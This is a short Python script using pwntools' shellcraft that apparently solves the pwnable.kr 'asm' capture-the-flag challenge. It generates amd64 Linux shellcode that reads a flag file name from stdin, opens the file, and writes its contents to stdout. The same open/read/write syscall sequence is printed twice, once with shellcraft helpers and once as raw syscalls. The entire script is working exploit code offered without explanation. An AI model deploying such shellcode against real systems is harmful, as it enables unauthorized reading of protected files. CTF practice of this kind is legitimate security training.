from pwn import *
filename = "./this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong\x00"
filename_add = 0x41414500
flag_add = 0x41414700
context(arch='amd64', os='linux')
stdin = 0
stdout = 1
print shellcraft.read(stdin, filename_add, len(filename))
print shellcraft.open(filename_add, 0, 0400)
print shellcraft.read('rax', flag_add, 100)
print shellcraft.write(stdout, flag_add, 100)
print shellcraft.amd64.linux.syscall('SYS_read', stdin, filename_add, len(filename))
print shellcraft.amd64.linux.syscall('SYS_open', filename_add, 0, 0400)
print shellcraft.amd64.linux.syscall('SYS_read', 'rax', flag_add, 100)
print shellcraft.amd64.linux.syscall('SYS_write', stdout, flag_add, 100)
